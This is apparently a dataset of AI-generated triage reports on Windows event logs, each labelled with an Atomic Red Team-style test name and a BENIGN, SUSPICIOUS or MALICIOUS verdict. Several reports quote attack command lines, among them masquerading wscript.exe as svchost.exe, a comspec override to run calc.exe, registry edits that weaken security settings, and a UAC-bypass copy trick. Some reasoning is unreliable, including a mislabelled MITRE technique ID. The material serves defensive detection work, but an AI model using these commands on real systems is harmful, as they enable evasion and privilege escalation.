The observed behavior, particularly with respect to the PowerShell command modifications influencing profiling, points to a likely compromise or active malware attempting to gain control over code execution or modify application behaviors. Immediate attention is needed to isolate the impacted host and scrutinize these behaviors alongside potential impacts on the system or network. Further investigation and forensic analysis should be initiated to ascertain the extent and intent of these actions. 

### Recommendations
- Isolate the affected machine from the network to prevent further potential malicious activity spread.
- Further analyze the PowerShell and profiler-related activities for the presence of known signatures or hash values.
- Check for unauthorized accounts or changes to user privileges and recent installations.
- Conduct thorough endpoint and network security assessments to ensure no further indicators of compromise are present.
"
Dynamic API Resolution-Ninja-syscall,"Upon careful examination of the provided Windows event logs across different categories including System, Windows PowerShell, Security, Application, and Sysmon, here is the detailed analysis:

### **Analysis:**

1. **System Logs:**
   - The logs show various activities related to Windows Update operations and the initiation of security updates for Microsoft Defender Antivirus with no irregularities. These activities align with routine system updates.

2. **Windows PowerShell Logs:**
   - There is a suspicious PowerShell execution that involved starting a process named `ninja_syscall1.exe` from a temporary directory. This is unusual as temporary directories are commonly used by malicious actors to execute unauthorized scripts or binaries.
   - Additionally, the script attempts to remove a potentially generated log file (`hello.log`), which indicates an attempt to hide activity, a common tactic observed in malicious operations.

3. **Security Logs:**
   - Multiple unsuccessful access attempts for a Microsoft account with return code 3221226021, indicating potential misconfiguration or failed login attempts. However, these do not provide direct indications of compromise but require monitoring for abnormal access patterns.

4. **Application Logs:**
   - The operation of Windows Defender is logged as ON, suggesting that the system's defense mechanisms were active as intended.

5. **Sysmon Logs:**
   - Multiple event entries involving PowerShell, ninja_syscall1.exe, and standard Windows utilities like wevtutil.exe and hostname.exe are observed.
   - The execution of `ninja_syscall1.exe` suggests execution beyond standard operations, especially since the binary lacks typical metadata fields such as FileVersion or Company, which is unusual and suspicious.
   - The presence of `wevtutil.exe` could be associated with event log management, which is sometimes employed within malicious sequences.

### **Assessment:**

- The combination of execution patterns and the nature of the file paths implies non-standard activity on the host. The PowerShell script initiation of an executable from a suspicious path, alongside its behavior of cleaning up potential logs, is indicative of **suspicious behavior**.

### **Resolution: SUSPICIOUS**

- Since the logs reveal activity that deviates from normal administrative actions typically expected on a server (such as unrecognized executables in temporary directories), this mandates further investigation. The potential risk is associated with the execution of undetermined and potentially malicious scripts or binaries and an attempt at concealing this activity.

**Guidance:**
- Conduct a thorough investigation into the file (`ninja_syscall1.exe`). Check its origin, purpose, and any associated hash values for known malware signatures.
- Review user activity around `admin_test`, ensuring that all scripts and access to directories were authorized and intended.
- Ensure audit and logging configurations are up-to-date and alerting on suspicious patterns.
- Consider isolating the host from the network until the investigation confirms benign activity or recovers from potential threats.
- Perform a security scan utilizing up-to-date antivirus/malware detection tools across the system for additional assurance."
Delete a single file - Windows PowerShell,"**Detailed Analysis of Logs**

1. **PowerShell Logs:**
   - Consistent entries with the process `powershell.exe` executing a command to remove a file from the temporary directory: `Remove-Item -path $env:TEMP\deleteme_data.004`.
   - There are several entries indicating the same PowerShell command across different modules: Registry, Alias, Environment, FileSystem, Function, and Variable.
   - While the consistent removal of temporary files is often indicative of cleanup tasks or scripted maintenance activities, without additional context on whether this file is known or suspicious, it's difficult to directly indicate malice.

2. **Sysmon Logs:**
   - Repeated executions of processes like `wevtutil.exe`, `conhost.exe`, and `MicrosoftEdgeUpdate.exe` are observed.
   - Multiple executions of `MicrosoftEdgeUpdate.exe` and related update and installation processes (`setup.exe`) for Microsoft Edge indicates a routine update process.
   - Entries suggesting PowerShell execution by `SERVER002\admin_test` to remove a temporary file, aligning with the PowerShell logs.

3. **Observations:**
   - The majority of processes, such as `MicrosoftEdgeUpdate.exe` and other Microsoft-related executables, are associated with legitimate update activities.
   - The user `SERVER002\admin_test` is consistently associated with processes in PowerShell, showing common administrative tasks.
   - There is no indication of significantly anomalous behavior like unusual privilege escalations, execution of unknown binaries, or network connections to suspicious IPs.
   - The logged entries coincide with potentially benign activities like system updates and temporary file cleanup.

**Assessment of Situation:**
- **Suspicious Aspects:** The PowerShell logs show repeated deletion of a specific temporary file, which could raise suspicion if the file had known malicious content. As is, the logs simply reflect a clean-up command, though in real-time analysis context such a behavior would warrant checking the contents and origin of `deleteme_data.004` for assurance.
- **Risks Identified:** Rely on the authenticity of user `SERVER002\admin_test` and the context—whether they frequently run maintenance tasks or scripts similar to those logged ensures benign actions.
- **Threats Identified:** There are no concrete activities pointing towards compromise or malware activity.

**Guidance on How to Proceed:**
- Validate the administrative user `admin_test` and their regular activities to ensure these actions are sanctioned.
- Analyze any available previous logs for similar repetitive tasks and confirm routine update patterns for `MicrosoftEdgeUpdate.exe`.
- Check the output of the `Remove-Item` execution or redundant or excessive automation (e.g., scripts removing files that frequently regenerate).
- If possible, enable deeper logging or additional telemetry (e.g., script block logging in PowerShell) for higher confidence in benign activities observed.

**Resolution:**
- **BENIGN**: Based on the available evidence, the activities logged are consistent with legitimate administrative tasks and system updates. No explicit indicators of compromise or malicious intent were found in the log entries provided."
Modify Internet Zone Protocol Defaults in Current User Registry - cmd,"Upon analyzing the provided event logs, I have observed the following noteworthy items:

1. **Time Manipulation**:
   - There are multiple logs indicating time changes involving `svchost.exe` (Event IDs 24 and 1 from the System log, and Event ID 4616 from the Security log). Often, changes to the system time can be indicative of malicious attempts to manipulate time-based security mechanisms or logs. However, without more context, such as a specific cause or causative process, these actions alone might not be conclusive of malicious behavior.

2. **Command Execution and Registry Modification**:
   - The execution of `cmd.exe` with parameters `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v http /t REG_DWORD /d 0 /F & reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v https /t REG_DWORD /d 0 /F` (EventRecordID 17977 and its subsequent logs) is suspicious. This action is modifying the registry settings related to internet zone mappings for HTTP and HTTPS protocols. Registry changes, especially around protocol settings, can point to malicious attempts to modify browser security settings or redirect traffic.

3. **Services and Updates**:
   - Logs show numerous events related to `MicrosoftEdgeUpdate.exe`, functioning as part of an update or installation process. This sequence appears consistent with legitimate update procedures for Microsoft Edge, albeit occurring within a short timeframe. The rapid invocation and termination of these processes can be typical of service updates.

4. **Process Activity**:
   - Several processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `reg.exe` are observed executing in a typical fashion, likely related to user or system administration tasks on `SERVER002`.

**Assessment and Resolution**:
- While the presence of registry modifications via `cmd.exe` is highly suspicious and warrants further scrutiny, the rest of the behavior captured in the logs does not demonstrate overtly malicious actions.

**Threats or Risks Identified**:
- Risk of malicious registry alterations which could impact browser security settings.
- Possible concealment or obfuscation efforts tied to system time changes.

**Guidance on How to Proceed**:
- Conduct a thorough review of the registry changes to verify their legitimacy and intended purpose. Understanding who initiated these commands could provide further context.
- Investigate the legitimacy of the time changes. Look for associated processes or external influences which may have triggered these events.
- Monitor the system for any unusual network activity potentially linked to changes in internet settings protocols.

Based on the evidence observed, the activity is classified as **SUSPICIOUS**, indicating it warrants further investigation to mitigate potential compromises."
Invoke CHM with Script Engine and Help Topic,"Upon analyzing the provided logs, here is a detailed assessment of the activities:

1. **Repeated PowerShell and Wevtutil Usage**:
   - Multiple instances of `powershell.exe` and `wevtutil.exe` are executed by the user `SERVER002\\admin_test`. Specifically, the PowerShell command is utilizing a script with the command:
     ```plaintext
     ""powershell.exe"" & {Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm}
     ```
   - The above PowerShell command with `Invoke-ATHCompiledHelp` is highly unusual and suspicious. Such complex scripts can often be indicative of post-exploit activities or lateral movement attempts. This specific use could be related to malicious activity attempting to exploit system vulnerabilities using Windows Help (`hh.exe`).

2. **Frequent use of Wevtutil.exe**:
   - `wevtutil.exe` is a system utility to manage event logs. Its frequent invocation might suggest manipulation or clearing of event logs, which is a common tactic for malware or attackers attempting to cover tracks.

3. **System Integrity and Update Activities**:
   - Several legitimate processes related to system update and maintenance activities such as `svchost.exe`, Microsoft Edge updates, and system processes like `SearchProtocolHost.exe` and `SearchFilterHost.exe` are noted. However, these appear consistent with typical system maintenance and update operations.
  
4. **Execution of `whoami.exe`**:
   - The presence of `whoami.exe` implies an attempt to identify the current logged-on user. While not directly malicious, it further indicates potential reconnaissance or manual interaction.

5. **EdgeUpdate and Setup Activities**:
   - The `EdgeUpdate` processes, while numerous, appear aligned with legitimate software update operations conducted by the `NT AUTHORITY\SYSTEM`. Their command lines reflect actions typical of software installations and updates. Besides, there is no indication of suspicious activity in these processes.

**Conclusion**:
- There are clear indicators that merit the classification of this activity as **SUSPICIOUS**. The specific PowerShell command involving `Invoke-ATHCompiledHelp` combined with repeated uses of `wevtutil.exe`, without any corresponding benign explanation, warrants further investigation.
- It's important to check for unauthorized scripts or scheduled tasks and review user actions tied to `SERVER002\\admin_test`.
- Recommend capturing a memory dump of the system for further forensic analysis and checking network logs for any abnormal outbound connections.
- If further evidence emerges during the investigation, the classification might need elevation to **MALICIOUS**.

**Resolution**: SUSPICIOUS - logs contain activity that doesn't look right and needs more investigation."
UACME Bypass Method 31,"Upon reviewing the provided logs, certain activities stand out as potentially suspicious, although not definitively malicious without further context or investigation. Here is the detailed analysis:

### Analysis:

1. **Usage of `cmd.exe` and Powershell**:
   - There are multiple instances of `cmd.exe` being executed with a command-line argument pointing to a path within the `AppData\\Local\\Temp\\` directory for executing a file named `31 Akagi64.exe`. The context suggests a file execution designed to run commands from directories often avoided for legitimate executable storage, which can indicate potential malicious intent.
   - The parent process for one `cmd.exe` is a PowerShell script that seems to be checking the existence of what appears to be a suspicious path, which is often indicative of preparation for execution of a potential payload or tool.

2. **Frequent Execution of `wevtutil.exe`**:
   - The Sysmon logs record instances where `wevtutil.exe` is executed multiple times. This tool manages event logs and resets, retrieves, or archives them. Malicious actors sometimes use it to clear logs to cover their tracks.

3. **Microsoft Edge Update Processes**:
   - There is a variety of Microsoft Edge Update processes running. While this could be a legitimate update, the high frequency and repetition, including some processes involving `MicrosoftEdgeUpdateComRegisterShell64.exe`, might be excessive for a single update window and could potentially signal other processes masquerading as legitimate updates.

4. **High Integrity Level Operations**:
   - Several processes run with a High or System-level integrity, including potentially suspicious `cmd.exe` calls. This indicates that the process has high privileges, which if compromised or malicious would have significant system access.

5. **Activity in Temporary Directories**:
   - Focus on activity within temporary directory structures (`AppData`) and execution of binaries from this location can be a red flag for malicious activities because these are often staging grounds for malware before execution.

### Conclusion:

Based on the above indicators, the activities recorded in the logs can be classified as **SUSPICIOUS**. This status is primarily due to the combination of contextually unusual process executions, such as handling of Edge Update processes, unusual file executions, and cleaning up with `wevtutil.exe`.

### Guidance:

- **Immediate Actions**: Isolate and review the `31 Akagi64.exe` for any malicious signatures and ensure it is not being used for unauthorized activities. Verify if the multiple Edge updates are legitimate.
- **Further Investigation**: Conduct a deeper analysis into system changes using a more comprehensive set of forensic data to understand what changes were made to the system.
- **Monitoring and Alerts**: Enhance monitoring around file executions and process creations in temporary directories and administrative-level commands to capture any possible unwanted or malicious activities promptly.
- **Review Defender Logs**: Cross-reference with Windows Defender logs to see if any malware was detected or quarantined during these times.

Since the provided logs suggest unusual behavior that could be indicative of attempted malicious activities, further investigation is warranted before concluding a definitive malicious compromise."
Modify UseTPMKey Registry entry,"Upon analyzing the provided logs, we need to focus on events that suggest unusual activity such as process executions from non-standard locations, unauthorized registry modifications, and the context in which these events occur. Here are some findings from the log analysis:

1. **Process Execution:**
   - There are multiple executions of `wevtutil.exe` and `conhost.exe` in quick succession. While these tools are legitimate Windows utilities (`wevtutil` for managing event logs and `conhost` as Console Host), their repeated invocation by `SERVER002\admin_test` should be scrutinized in context.
   - Notably, the use of command-line arguments within `cmd.exe` for registry editing (`reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f`) is particularly concerning. This action can represent a change in security settings to influence how encryption keys are handled. This action is executed under `SERVER002\admin_test` but authored from a high level of integrity, implying potential administrative privileges.
   - The execution of `reg.exe` immediately after `cmd.exe`, validating the registry command execution, furthers the researcher’s doubts about intentional configuration changes.

2. **Integrity Levels & User Context:**
   - The processes executed under `SERVER002\admin_test` are running with a `High` integrity level, which is typical for administrative tasks but requires verification whether this is within expected behavior for `admin_test`.
   - We also notice that most `MicrosoftEdgeUpdate` processes run under `NT AUTHORITY\SYSTEM`, conducting legitimate update tasks for the Microsoft Edge browser, which appears regular for system maintenance.

3. **Security Log Audit:**
   - Security auditing shows minor timezone adjustments with no direct relation to suspicious activity, but the need to match system times targeted by any process executions remains aware.

4. **System and Application Logs:**
   - Standard entries of time services and system updates do not immediately highlight unusual behavior. `edgeupdate` service stoppages are expected during application updates and restarts.

### Assessment

**Threat or Risk Identified:**
- The critical indicator of compromise lies in the registry modification through `cmd.exe` and `reg.exe`. This can result in a security configuration that might be used to bypass certain protection mechanisms or encryption settings.

**Guidance on How to Proceed:**
- Conduct a verification of the user `admin_test` activities during the time frame: Is this expected behavior for this user and process? Verify any related tickets or approved change requests.
- Check for any additional unauthorized modifications or attempted registry changes which aren’t logged currently.
- If deemed unintentional or unauthorized, consider rolling back the registry change and enhancing logging around similar binaries (`cmd.exe`, `reg.exe`).
- Strengthen alerting around registry edits and potential privilege escalation attempts to intervene sooner in future incidents.

### Resolution
- **SUSPICIOUS** - The registry modification activity is suspicious and requires further investigation to confirm whether it was a result of malicious intent or a misunderstood administrative action."
Masquerading - wscript.exe running as svchost.exe,"In reviewing the provided logs, a series of events stand out, which may suggest potential malicious behavior:

1. **Events in Security Log (EventID 5379):** These events show attempts to access account credentials, but with a ReturnCode of ""3221226021"", which typically indicates an invalid handle error. This could be a benign failed authentication process or an indication of an attempt to access or verify credentials inappropriately.

2. **Sysmon Log Analysis:**
    - **PowerShell and Wevtutil Execution:** Multiple instances of PowerShell (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) and Windows Event Utility (`C:\\Windows\\System32\\wevtutil.exe`) are being executed under a user account ""SERVER002\\admin_test"". Wevtutil is often used in attacks for event log clearing, which could be suspicious if seen here.
    - **Cmd.exe Misuse:** A `cmd.exe` process is seen executing a command to copy `wscript.exe` to `%APPDATA%\\svchost.exe` followed by executing a script file (`data.003_masquerading.vbs`). This is a strong indication of script execution and potential masquerading tactics, which is often associated with malicious activity. The presence of `wscript.exe` and `.vbs` files indicates use of VBScript, a common tool for attackers.
    - **Execution of svchost.exe and script from unusual directories:** The execution of a renamed `svchost.exe` from within `%APPDATA%` and another `.exe` in the `Roaming` folder is particularly suspicious as this directory is often misused for persistence by attackers.
    - **High Integrity and System Level Processes:** The processes have been executed with high integrity; this could mean administrative privileges were potentially used which is common for privilege escalation or persistence techniques.

3. **Window Update Activity:** Regular update activities are seen which seem consistent with normal Windows updates. These appear benign.

**Assessment:**
The events captured, particularly related to the misuse of cmd.exe and the execution of scripts from non-standard paths, align with tactics often used by attackers to achieve persistence and establish control over a system. While the credential access attempts with EventID 5379 may not have yielded data due to the error code returned, it should not be ignored in the broader context, as it may indicate exploration by an attacker.

**Resolution: MALICIOUS**
- The evidence of masquerade and potential script execution paired with misuse of wscript and svchost names masquerading suggests malicious activity.

**Guidance on How to Proceed:**
- Conduct a detailed examination of the affected system to identify traces of the `data.003_masquerading.vbs` script and determine its contents.
- Validate the source and legitimacy of any PowerShell commands executed and investigate any abnormal use of wevtutil indicating possible event log tampering.
- Check the integrity state and hash values of critical system files (e.g., svchost.exe, wscript.exe) to ensure they are not tampered with.
- Audit user ""admin_test"" activities and verify account permissions are not excessively privileged.
- Review network activity logs if possible, to check exfiltration or anomalous outgoing traffic during the timeframe of these events.
- Engage in incident response procedures to mitigate potential compromise, including possible isolation of the affected system and detailed root cause analysis."
manage-bde.wsf Signed Script Command Execution,"Upon examining the provided event logs, I have identified some activities worth noting:

1. **Time Change Events:**
   - Multiple kernel general (`EventID 1`) events and security auditing (`EventID 4616`) logs indicate a time change on `Server002`. The process responsible is `svchost.exe`, a legitimate Windows process, commonly used for running various system services. While time modifications can sometimes be associated with malicious activity, these appear to be executed by `LOCAL SERVICE` and aren't inherently suspicious without additional context, such as manual intervention or inconsistency in system logs.

2. **Sysmon Logs:**
   - There are multiple executions of `wevtutil.exe` and `conhost.exe` under the user `admin_test`. The repeated invocation of `wevtutil.exe`, a command-line tool for managing Windows Event Logs, could indicate log alteration or querying, which might be suspicious if unexpected. However, without further details demonstrating unusual parameters or outcomes, it's ambiguous.
   - `cmd.exe` is launched with the command line `\""cmd.exe\"" /c set comspec=%%windir%%\\System32\\calc.exe & cscript %%windir%%\\System32\\manage-bde.wsf`. This is a more apparent red flag. The command appears to override the `%comspec%` environment variable to execute `calc.exe`, which is unconventional and typically indicative of an attempt to obfuscate or bypass usual command execution. Such behavior can be associated with advanced attacks trying to evade detections.

3. **Process Sequences and Integrity Levels:**
   - High integrity level executions like `cmd.exe`, `whoami.exe`, and other system tools suggest that actions are executed with elevated privileges. This is typical for administrative tasks but should be scrutinized in a security context, given unconventional commands or sequences.

Overall, some activities suggest potential misuse or abnormal security practices, particularly the command alterations using `cmd.exe` and `cscript.exe`. The analysis lacks specific context; it would be judicious for an analyst to investigate the user `admin_test`, cross-reference company protocols, and potentially check network logs for any deviations or external correlations.

### Conclusion:
**Resolution: SUSPICIOUS**

The activities identified in your logs, particularly the misuse of command-line tools for unusual environment changes, warrant further investigation. Focus especially on the context around these command usages, the user's actions, and any potential exfiltration or lateral movement attempts.

**Guidance:**
- Review user activity, especially `admin_test`, including logins, administrative actions, and access patterns.
- Validate whether similar event patterns are common across other systems or unique to this one.
- Consider deploying enhanced monitoring around sensitive commands and user actions.
- Cross-reference network logs or security alerts for corroborative signs of breaches or policy violations."
Bypass UAC by Mocking Trusted Directories,"After reviewing the provided Windows event logs, the following observations can be made:

1. **Time Change Events**: 
   - The security and system logs indicate events with EventID 4616 and 1 related to time changes. These suggest that the system clock was altered, as seen in the `NewTime` and `OldTime` fields. While some time updates and corrections are normal, especially for synchronization, unexpected or unauthorized time change events can potentially indicate attempts to manipulate logs or confuse incident analysis processes.

2. **Privilege Usage by ""admin_test"" Account**:
   - Multiple 4672 events indicate that the ""admin_test"" account was granted a wide array of privileges, such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges could allow the user to execute code in the context of another process or take ownership of certain system objects, respectively, signifying the account has high capabilities on the system. The use of a test admin account with such privileges occurring frequently raises suspicion.

3. **Logon Events**:
   - Logon events (4624) and logoff events (4634) show interactive logon by ""admin_test"" coming from an external workstation `""DESKTOP-3HL5B2P""`. Excessive administrative logon sessions, especially from non-typical sources, merit scrutiny to ensure that they follow expected patterns or maintenance schedules. The related IP addresses being unique suggests diverse connection points, though without outright malicious IPs.

4. **Usage of Command Line Tools**:
   - Sysmon logs show repeated usage of tools like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and most notably a suspicious `cmd.exe` command with a long command line. The specific command line involves seemingly odd actions like copying `cmd.exe` to `mmc.exe` and creating a link `c:\testbypass.exe`. This action is highly irregular for legitimate user activity and very much indicative of malicious behavior or an attempt to hide potentially malicious intent under the guise of normal Windows utilities.

5. **Execution of Hostname, WHOAMI, and CMD utilities with High Integrity**:
   - The execution of `HOSTNAME.EXE`, `WHOAMI.EXE`, and `CMD.EXE` each with `High` integrity by ""admin_test"" is noteworthy. The utilities by themselves are standard but their combination can signal reconnaissance or configuration manipulation actions typically seen during phases of an attack.

### Assessment

The analysis of the logs suggests activities that warrant serious investigation:

- The presence of numerous high-privilege actions with a test admin account.
- An unusual sequence of command-line operations that mimic the tactics often associated with malicious actors attempting to maintain stealth (e.g., T1191: Exploit Public-Facing Application).
- Manipulations of time and the handling of named administrative accounts are also signals to probe deeper.

Based on the evidence available and given the potentially harmful operations that have been logged, the final resolution is:

**MALICIOUS** - The logs contain activity that is strongly indicative of unauthorized and potentially harmful behavior that warrants immediate attention, containment, and further detailed forensic investigation to understand the full scope and impact of the compromise.  

### Guidance

1. **Immediate Escalation**: Inform the incident response team to initiate a more thorough investigation, focusing on the high-privilege account and suspicious command-line activities.
2. **Account Verification**: Verify the legitimacy and intended use of the ""admin_test"" account and restrict or secure it if needed.
3. **Log Analysis & Threat Hunting**: Deepen log analysis for more indicators of compromise and verify if the threatening command-lines were executed; identify the catalysts and impact.
4. **Network Monitor**: Continue closely monitoring for unintended external communications or lateral movements across the network.
5. **Security Patching/Update**: Ensure system patches are up-to-date and review security policies for restrictive measures against potential attack vectors."
Disabling ShowUI Settings of Windows Error Reporting (WER),"### Log Analysis

Upon reviewing the provided logs, several actions and events caught my attention:

1. **Edge Update Activity:**
   - Multiple events in the Sysmon logs indicate activity related to Microsoft Edge Update. Various instances of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86.exe` are executed with different command-line arguments such as `/svc`, `/update`, `/regsvc`, '/regserver', `/c`, and `/ua /installsource core`.
   - These commands are typically associated with legitimate software update processes, especially for browsers and critical system software, but may warrant further investigation if these updates were not expected or if the update schedule was not known.
   - All processes ran under the `NT AUTHORITY\SYSTEM` user context, which is expected for such system-level updates.

2. **Whoami and Hostname Commands:**
   - The execution of `whoami.exe` and `hostname.exe` can be considered standard, especially for scripts or troubleshooting activities, especially if used by users in an 'admin' context for identifying current user and system environment details.
   - These commands were executed by `SERVER002\admin_test`, a user seemingly with administrative privileges.

3. **Registry Modification with Reg.exe:**
   - An event showing `reg.exe` being used to modify a registry key, specifically to add `DontShowUI` for Windows Error Reporting, appeared suspicious.
   - This change is often made to suppress error messages potentially hiding issues from the user, which can be suspicious if not carried out by an IT administrative task.

4. **Miscellaneous Service Stops:**
   - The `edgeupdate` service logs indicate the service stopped events. While stopping of services can be routine, without additional context on why these services were stopped, if this action was unexpected or unauthorized, it could warrant further investigation.

5. **Timing and Context:**
   - The logs display heavy use of installer and update modules in a short timeframe. If this is outside the policy-scheduled update time, it needs clarification from the IT admin team whether these actions were anticipated.

### Assessment:

- **BENIGN:** Given the logs seem to correlate with legitimate software update activities for Microsoft Edge Update and the running of standard diagnostic commands like `whoami` and `hostname`, these operations are not inherently malicious. However, legitimate tools used in unintentional or unsanctioned ways can still contribute to security risks.

### Recommended Actions:

1. **Validation of Updates:**
   - Confirm with IT administration if the Microsoft Edge updates were expected and scheduled, and whether they align with the organization's update policies.
   
2. **Review of User Activity:**
   - Check recent activities or scripts launched by `SERVER002\admin_test` to ensure that they are part of regular or sanctioned administrative tasks. Ensure correlation with scheduled maintenance.

3. **Registry Change Review:**
   - Investigate the purpose of the registry modification using `reg.exe`. If this was not part of a sanctioned administrative script, reassess user permissions and script executions.

4. **Monitoring and Additional Logging:**
   - Continue monitoring similar activities, particularly for unexpected service stops and unplanned command executions, and ensure logging configurations capture detailed process creation events for future retrospectives."
